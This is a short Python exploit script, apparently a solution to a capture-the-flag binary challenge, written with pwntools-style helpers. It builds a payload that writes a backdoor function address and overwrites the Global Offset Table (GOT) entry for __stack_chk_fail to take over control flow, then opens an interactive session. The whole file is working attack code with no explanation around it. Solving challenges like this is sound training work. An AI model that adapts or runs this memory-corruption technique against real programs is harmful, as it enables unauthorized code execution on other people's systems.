#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
# libc: ELF = gift.libc

backdoor_addr = 0x4012F6

ru(b"What is your first name? ")
payload = flat(
    {
        0x000: backdoor_addr,
        0x130: elf.got.__stack_chk_fail,
        0x140: 0xDEADBEEF,
    }
)
sl(payload)

ru(b"How old are you? ")
sl(i2b(0xDEADBEEF))

ia()
